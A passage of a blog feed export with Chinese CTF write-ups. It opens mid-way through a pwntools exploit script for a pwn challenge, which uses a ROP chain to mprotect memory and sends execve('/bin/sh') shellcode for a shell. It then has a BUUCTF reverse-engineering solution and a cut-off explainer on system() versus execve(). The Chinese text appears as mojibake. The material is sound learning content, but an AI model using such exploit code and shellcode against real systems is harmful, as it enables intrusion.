class="string">b&#x27;-100000&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040264f : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000040a67e : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000402aae : pop rsp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401b01 : pop rbp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000458827 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004a404b : pop rdx ; pop rbx ; ret</span></span><br><span class="line">rdi_addr = <span class="number">0x40264f</span></span><br><span class="line">rsi_addr = <span class="number">0x40a67e</span></span><br><span class="line">rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">name_addr = <span class="number">0x4e60f0</span></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">0x4e6000</span>) </span><br><span class="line">payload += p64(rsi_addr) + p64(<span class="number">0x3000</span>)</span><br><span class="line">payload += p64(rdx_rbx) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(mprotect_addr) + p64(ret_addr) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. å‹‡é—¯å¤©æ¶¯\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;æ¥å‡ ç“¶ï¼Ÿ&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-100000&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x28</span> , <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(name_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF åˆ®å¼€æœ‰å¥–</title>
      <link href="/posts/d66b9a90/"/>
      <url>/posts/d66b9a90/</url>
      
        <content type="html"><![CDATA[<h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸‹è½½é™„ä»¶åï¼Œæ‹–è¿›dieåˆ†æ</p><p><img src="https://pic.imgdb.cn/item/66b472e4d9c307b7e9d02e3f.png"></p><p>32ä½æ— å£³ï¼Œç›´æ¥æ‹–è¿›idaåˆ†æ</p><p>shift+f12æŸ¥çœ‹å­—ç¬¦ä¸²</p><p><img src="https://pic.imgdb.cn/item/66b47308d9c307b7e9d04c75.png"></p><p>å‘ç°å¯ç–‘å­—ç¬¦ä¸²ï¼ŒåŒå‡»è¿›å»å‘ç°åŒ…å«å®ƒçš„å‡½æ•°</p><p><img src="https://pic.imgdb.cn/item/66b4731ed9c307b7e9d05c42.png"></p><p>åŒå‡»å‡½æ•°ååæŒ‰Tab&#x2F;F5åç¼–è¯‘æŸ¥çœ‹å‡½æ•°</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">INT_PTR __stdcall <span class="title">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">2</span>]; <span class="comment">// [esp+8h] [ebp-20030h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+10h] [ebp-20028h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+14h] [ebp-20024h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+18h] [ebp-20020h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-2001Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+20h] [ebp-20018h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+24h] [ebp-20014h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-20010h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+2Ch] [ebp-2000Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+30h] [ebp-20008h]</span></span><br><span class="line">  CHAR String[<span class="number">65536</span>]; <span class="comment">// [esp+34h] [ebp-20004h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">65536</span>]; <span class="comment">// [esp+10034h] [ebp-10004h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(String, <span class="number">0</span>, <span class="number">0xFFFFu</span>);</span><br><span class="line">    <span class="built_in">GetDlgItemTextA</span>(hDlg, <span class="number">1000</span>, String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(String) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7[<span class="number">0</span>] = <span class="number">90</span>;</span><br><span class="line">      v7[<span class="number">1</span>] = <span class="number">74</span>;</span><br><span class="line">      v8 = <span class="number">83</span>;</span><br><span class="line">      v9 = <span class="number">69</span>;</span><br><span class="line">      v10 = <span class="number">67</span>;</span><br><span class="line">      v11 = <span class="number">97</span>;</span><br><span class="line">      v12 = <span class="number">78</span>;</span><br><span class="line">      v13 = <span class="number">72</span>;</span><br><span class="line">      v14 = <span class="number">51</span>;</span><br><span class="line">      v15 = <span class="number">110</span>;</span><br><span class="line">      v16 = <span class="number">103</span>;</span><br><span class="line">      <span class="built_in">sub_4010F0</span>(v7, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFFu</span>);</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">5</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">7</span>];</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">6</span>];</span><br><span class="line">      v4 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_401000</span>(v18, <span class="built_in">strlen</span>(v18));</span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFFu</span>);</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">3</span>];</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">2</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">4</span>];</span><br><span class="line">      v5 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_401000</span>(v18, <span class="built_in">strlen</span>(v18));</span><br><span class="line">      <span class="keyword">if</span> ( String[<span class="number">0</span>] == v7[<span class="number">0</span>] + <span class="number">34</span></span><br><span class="line">        &amp;&amp; String[<span class="number">1</span>] == v10</span><br><span class="line">        &amp;&amp; <span class="number">4</span> * String[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * v8</span><br><span class="line">        &amp;&amp; String[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (v13 / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">EndDialog</span>(hDlg, (<span class="type">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°è§£æ"><a href="#å‡½æ•°è§£æ" class="headerlink" title="å‡½æ•°è§£æ"></a>å‡½æ•°è§£æ</h3><h4 id="DialogFunc-å‡½æ•°"><a href="#DialogFunc-å‡½æ•°" class="headerlink" title="DialogFunc()å‡½æ•°"></a>DialogFunc()å‡½æ•°</h4><p><code>DialogFunc()</code>å‡½æ•°çš„ä½œç”¨é€šå¸¸æ˜¯å¤„ç†å¯¹è¯æ¡†çš„åˆ›å»ºå’Œæ¶ˆæ¯ä¼ é€’ã€‚è¿™ä¸ªå‡½æ•°é€šå¸¸ä¸å›¾å½¢ç”¨æˆ·ç•Œé¢ï¼ˆGUIï¼‰ç¼–ç¨‹æœ‰å…³ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨ Windows API æˆ–ç±»ä¼¼åº“æ—¶ã€‚å®ƒå¤„ç†ç”±å¯¹è¯æ¡†çª—å£æ¥æ”¶çš„æ‰€æœ‰æ¶ˆæ¯ï¼Œä¾‹å¦‚æŒ‰é’®ç‚¹å‡»ã€æ–‡æœ¬è¾“å…¥ç­‰ã€‚</p><h4 id="memsetå‡½æ•°"><a href="#memsetå‡½æ•°" class="headerlink" title="memsetå‡½æ•°"></a>memsetå‡½æ•°</h4><p><code>memset()</code> å‡½æ•°æ˜¯ C æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†ä¸€å—å†…å­˜åŒºåŸŸçš„å†…å®¹è®¾ç½®ä¸ºæŒ‡å®šçš„å€¼ã€‚å®ƒé€šå¸¸ç”¨äºåˆå§‹åŒ–æˆ–é‡ç½®å†…å­˜ä¸­çš„æ•°æ®ã€‚</p><h4 id="GetDlgItemTextA-å‡½æ•°"><a href="#GetDlgItemTextA-å‡½æ•°" class="headerlink" title="GetDlgItemTextA()å‡½æ•°"></a>GetDlgItemTextA()å‡½æ•°</h4><p><code>GetDlgItemTextA()</code> å‡½æ•°æ˜¯ Windows API ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºä»æŒ‡å®šçš„å¯¹è¯æ¡†æ§ä»¶ï¼ˆä¾‹å¦‚ç¼–è¾‘æ¡†ã€é™æ€æ–‡æœ¬æ§ä»¶ç­‰ï¼‰ä¸­æ£€ç´¢æ–‡æœ¬ã€‚è¿™ä¸ªå‡½æ•°æ˜¯ <code>GetDlgItemText()</code> å‡½æ•°çš„ ANSI ç‰ˆæœ¬ï¼ˆå¸¦æœ‰ <code>A</code> åç¼€ï¼‰ï¼Œç”¨äºå¤„ç† ANSI å­—ç¬¦é›†ã€‚</p><h3 id="åŠ å¯†é€»è¾‘åˆ†æ"><a href="#åŠ å¯†é€»è¾‘åˆ†æ" class="headerlink" title="åŠ å¯†é€»è¾‘åˆ†æ"></a>åŠ å¯†é€»è¾‘åˆ†æ</h3><p>é¦–å…ˆçœ‹è¿™ä¸€éƒ¨åˆ†</p><p><img src="https://pic.imgdb.cn/item/66b4733bd9c307b7e9d07290.png"></p><p>10h-08h&#x3D;08hï¼Œä¸€ä¸ªintå››ä¸ªå­—èŠ‚ï¼Œæ­£å¥½å¯¹åº”v7ä¸¤ä¸ªå€¼çš„å†…å­˜</p><p>14h-10h&#x3D;04hï¼Œä¹Ÿæ˜¯ä¸€ä¸ªintç±»å‹çš„4ä¸ªå­—èŠ‚</p><p>å³v7-v16ä¸ºä¸€ä¸ªæ•°ç»„çš„å€¼</p><p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå‘ç°åŠ å¯†å‡½æ•°sub_4010F0()</p><p>ç»§ç»­å¾€ä¸‹çœ‹</p><p><img src="https://pic.imgdb.cn/item/66b4734ed9c307b7e9d08148.png"></p><p>å‘ç°v4,v5æ˜¯åˆ†åˆ«åœ¨stringå¯¹v18èµ‹å€¼åå†ç»è¿‡sub_401000()å‡½æ•°</p><p>å¹¶å°†æœ€åçš„ç»“æœv4ä¸ak1wæ¯”è¾ƒï¼Œv5ä¸V1Axæ¯”è¾ƒ</p><p>æ‰€ä»¥åŠ å¯†çš„é€»è¾‘ä¸ºï¼Œv7æ•°ç»„å…ˆç»è¿‡sub_4010F0()å‡½æ•°å¾—åˆ°æ–°çš„æ•°ç»„å€¼ï¼Œå†å°†æ–°çš„æ•°ç»„å€¼èµ‹å€¼ç»™v4ï¼Œv5ã€‚v4ï¼Œv5ç»è¿‡å‡½æ•°sub_401000()å†ä¸ç»™å‡ºçš„ä¸¤ä¸ªå­—ç¬¦ä¸²åšæ¯”è¾ƒã€‚æ‰€ä»¥æˆ‘ä»¬çš„é‡å¿ƒä¾¿æ˜¯åˆ†æä¸¤ä¸ªåŠ å¯†å‡½æ•°</p><h3 id="sub-401000-å‡½æ•°"><a href="#sub-401000-å‡½æ•°" class="headerlink" title="sub_401000()å‡½æ•°"></a>sub_401000()å‡½æ•°</h3><p>é¦–å…ˆçœ‹sub_401000()</p><p><img src="https://pic.imgdb.cn/item/66b47368d9c307b7e9d0959d.png"></p><p>è§‚å¯Ÿå‡½æ•°å‘ç°æ˜¯å…¸å‹çš„base64åŠ å¯†ï¼Œå†çœ‹byte_407830å‘ç°æ˜¯åŸºç¡€çš„baseè¡¨</p><p><img src="https://pic.imgdb.cn/item/66b47385d9c307b7e9d0b388.png"></p><p>é‚£ä¹ˆå°†å·²å¾—åˆ°çš„å­—ç¬¦ä¸²è¿›è¡Œbase64è§£å¯†</p><p>åˆ†åˆ«å¾—åˆ°stringçš„ç¬¬2ï¼Œ3ï¼Œ4ä¸ªå­—ç¬¦ï¼ˆv5æ¯”è¾ƒçš„å­—ç¬¦ä¸²base64è§£å¯†ï¼‰ä¸ºï¼šWP1</p><p><img src="https://pic.imgdb.cn/item/66b47396d9c307b7e9d0c482.png"></p><p>stringçš„ç¬¬5ï¼Œ6ï¼Œ7ä¸ªå­—ç¬¦ï¼ˆv4æ¯”è¾ƒçš„å­—ç¬¦ä¸²base64è§£å¯†ï¼‰ä¸ºï¼šjMp</p><p><img src="https://pic.imgdb.cn/item/66b473a7d9c307b7e9d0d2ce.png"></p><h3 id="sub-4010F0-å‡½æ•°"><a href="#sub-4010F0-å‡½æ•°" class="headerlink" title="sub_4010F0()å‡½æ•°"></a>sub_4010F0()å‡½æ•°</h3><p>è¿›å…¥åˆ†æï¼Œå°±æ˜¯ä¸€ä¸ªåŠ å¯†çš„ç®—æ³•ï¼Œç›´æ¥å°†å‡½æ•°æ•´ä¸ªå¤åˆ¶ä¸‹æ¥</p><p>å…¶ä¸­çš„ _DWORD å¯¹åº”çš„å°±æ˜¯æ— ç¬¦å·å­—ç¬¦ç±»å‹</p><p><img src="https://pic.imgdb.cn/item/66b473c0d9c307b7e9d0e94d.png"></p><p>å†æ ¹æ®è¿™å››ä¸ªåˆ¤æ–­è¿˜åŸå‡ºstringçš„å‰å››ä¸ªå­—ç¬¦</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span>  <span class="comment">//ç«èµ›ç¼–ç¨‹ä¸­å¸¸ç”¨å¤´æ–‡ä»¶ï¼ŒåŒ…å«æ‰€æœ‰c++æ ‡å‡†åº“å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned char</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> v7[<span class="number">15</span>] = &#123;<span class="number">90</span>, <span class="number">74</span>, <span class="number">83</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">103</span>&#125;;</span><br><span class="line"><span class="type">char</span> string[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4010F0</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> i;      <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v5;     <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">int</span> v6;     <span class="comment">// edx</span></span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="keyword">for</span> (i = a2; i &lt;= a3; a2 = i)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = i;</span><br><span class="line">        v6 = *(_DWORD *)(i + a1);</span><br><span class="line">        <span class="keyword">if</span> (a2 &lt; result &amp;&amp; i &lt; result)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (v6 &gt; *(_DWORD *)(a1 + result))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++i;</span><br><span class="line">                    *(_DWORD *)(v5 + a1) = *(_DWORD *)(a1 + result);</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">while</span> (*(_DWORD *)(a1 + i) &lt;= v6)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (++i &gt;= result)</span><br><span class="line">                            <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    v5 = i;</span><br><span class="line">                    *(_DWORD *)(a1 + result) = *(_DWORD *)(i + a1);</span><br><span class="line">                &#125;</span><br><span class="line">                --result;</span><br><span class="line">            &#125; <span class="keyword">while</span> (i &lt; result);</span><br><span class="line">        &#125;</span><br><span class="line">    LABEL_13:</span><br><span class="line">        *(_DWORD *)(a1 + result) = v6;</span><br><span class="line">        <span class="built_in">sub</span>(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">        result = a3;</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">sub_4010F0</span>(v7, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    cout &lt;&lt; v7 &lt;&lt; endl;</span><br><span class="line">    string[<span class="number">0</span>] = v7[<span class="number">0</span>] + <span class="number">34</span>;</span><br><span class="line">    string[<span class="number">1</span>] = v7[<span class="number">4</span>];</span><br><span class="line">    string[<span class="number">2</span>] = (<span class="number">3</span> * v7[<span class="number">2</span>] + <span class="number">141</span>) / <span class="number">4</span>;</span><br><span class="line">    string[<span class="number">3</span>] = <span class="number">8</span> * (v7[<span class="number">7</span>] / <span class="number">9</span>);</span><br><span class="line">    cout &lt;&lt; string &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œä»£ç å¾—åˆ°</p><p><img src="https://pic.imgdb.cn/item/66b473e1d9c307b7e9d10431.png"></p><p>å†å»å‰æ–‡å¾—åˆ°çš„string2ï¼Œ3ï¼Œ4ï¼Œ5ï¼Œ6ï¼Œ7ç»„åˆå¾—åˆ°flag</p><p>flag{UJWp1jMp}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Syetem()ä¸Execve()çš„åŒºåˆ«</title>
      <link href="/posts/fd137f81/"/>
      <url>/posts/fd137f81/</url>
      
        <content type="html"><![CDATA[<p><code>execve</code> å’Œ <code>system</code> æ˜¯ä¸¤ä¸ªå¸¸ç”¨çš„ç³»ç»Ÿè°ƒç”¨æˆ–åº“å‡½æ•°ï¼Œç”¨äºåœ¨ Unix-like æ“ä½œç³»ç»Ÿä¸­æ‰§è¡Œå…¶ä»–ç¨‹åºã€‚å®ƒä»¬æœ‰ä¸åŒçš„ç”¨é€”å’Œè¡Œä¸ºï¼Œä¸‹é¢è¯¦ç»†è§£é‡Šå®ƒä»¬çš„åŒºåˆ«ã€‚</p><h3 id="execve-å‡½æ•°"><a href="#execve-å‡½æ•°" class="headerlink" title="execve å‡½æ•°"></a><code>execve</code> å‡½æ•°</h3><p><code>execve</code> æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œç”¨äºåœ¨å½“å‰è¿›ç¨‹ç©ºé—´ä¸­æ‰§è¡Œä¸€ä¸ªæ–°çš„ç¨‹åºã€‚å…¶åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><h4 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><ul><li><code>pathname</code>ï¼šè¦æ‰§è¡Œçš„ç¨‹åºçš„è·¯å¾„ã€‚</li><li><code>argv</code>ï¼šä¼ é€’ç»™æ–°ç¨‹åºçš„å‚æ•°æ•°ç»„ã€‚æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ é€šå¸¸æ˜¯ç¨‹åºåç§°ï¼Œæœ€åä¸€ä¸ªå…ƒç´ å¿…é¡»æ˜¯NULLã€‚</li><li><code>envp</code>ï¼šä¼ é€’ç»™æ–°ç¨‹åºçš„ç¯å¢ƒå˜é‡æ•°ç»„ï¼Œæœ€åä¸€ä¸ªå…ƒç´ ä¹Ÿå¿…é¡»æ˜¯NULLã€‚</li></ul><h4 id="ç‰¹ç‚¹"><a href="#ç‰¹ç‚¹" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h4><ol><li><strong>ç›´æ¥æ›¿æ¢å½“å‰è¿›ç¨‹</strong>ï¼š<code>execve</code> è°ƒç”¨æˆåŠŸåï¼Œå½“å‰è¿›ç¨‹çš„ä»£ç ã€æ•°æ®å’Œå †æ ˆéƒ½è¢«æ›¿æ¢ä¸ºæ–°ç¨‹åºçš„å†…å®¹ï¼Œå½“å‰è¿›ç¨‹PIDä¿æŒä¸å˜ã€‚</li><li><strong>æ²¡æœ‰è¿”å›</strong>ï¼šå¦‚æœ <code>execve</code> è°ƒç”¨æˆåŠŸï¼Œå½“å‰è¿›ç¨‹ä¸ä¼šè¿”å›åˆ°è°ƒç”¨ç‚¹ã€‚åªæœ‰åœ¨è°ƒç”¨å¤±è´¥æ—¶æ‰ä¼šè¿”å›ï¼Œå¹¶è®¾ç½®é€‚å½“çš„é”™è¯¯ç ã€‚</li><li><strong>æ›´çµæ´»</strong>ï¼šå¯ä»¥æŒ‡å®šæ–°ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ã€å‚æ•°å’Œç¯å¢ƒå˜é‡ã€‚</li></ol><h4 id="ä½¿ç”¨ç¤ºä¾‹"><a href="#ä½¿ç”¨ç¤ºä¾‹" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *args[] = &#123; <span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="type">char</span> *env[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">execve(<span class="string">&quot;/bin/ls&quot;</span>, args, env);</span><br></pre></td></tr></table></figure><h3 id="system-å‡½æ•°"><a href="#system-å‡½æ•°" class="headerlink" title="system å‡½æ•°"></a><code>system</code> å‡½æ•°</h3><p><code>system</code> æ˜¯æ ‡å‡†Cåº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºé€šè¿‡è°ƒç”¨ <code>/bin/sh</code> æ¥æ‰§è¡Œä¸€ä¸ªå‘½ä»¤å­—ç¬¦ä¸²ã€‚å…¶åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span>;</span><br></pre></td></tr></table></figure><h4 id="å‚æ•°-1"><a href="#å‚æ•°-1" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h4><ul><li><code>command</code>ï¼šè¦æ‰§è¡Œçš„å‘½ä»¤å­—ç¬¦ä¸²ã€‚</li></ul><h4 id="ç‰¹ç‚¹-1"><a href="#ç‰¹ç‚¹-1" class="headerlink" title="ç‰¹ç‚¹"></a>ç‰¹ç‚¹</h4><ol><li><strong>åˆ›å»ºå­è¿›ç¨‹</strong>ï¼š<code>system</code> åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œç»™å®šçš„å‘½ä»¤å­—ç¬¦ä¸²ï¼Œçˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚</li><li><strong>ä¾èµ– shell</strong>ï¼š<code>system</code> ä½¿ç”¨ <code>/bin/sh -c</code> æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå› æ­¤å‘½ä»¤å­—ç¬¦ä¸²å¯ä»¥åŒ…å«ä»»ä½• shell æ”¯æŒçš„è¯­æ³•å’Œå‘½ä»¤ã€‚</li><li><strong>ç®€å•æ–¹ä¾¿</strong>ï¼šé€‚åˆæ‰§è¡Œç®€å•çš„å‘½ä»¤ï¼Œä½†ä¸å¦‚ <code>execve</code> çµæ´»ã€‚</li></ol><h4 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h4><ul><li>è¿”å›å‘½ä»¤æ‰§è¡Œçš„çŠ¶æ€ç ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œå¤±è´¥æˆ– <code>system</code> è°ƒç”¨å¤±è´¥ï¼Œåˆ™è¿”å›éé›¶å€¼ã€‚</li></ul><h4 id="ä½¿ç”¨ç¤ºä¾‹-1"><a href="#ä½¿ç”¨ç¤ºä¾‹-1" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> status = system(<span class="string">&quot;ls -l&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="åŒºåˆ«æ€»ç»“"><a href="#åŒºåˆ«æ€»ç»“" class="headerlink" 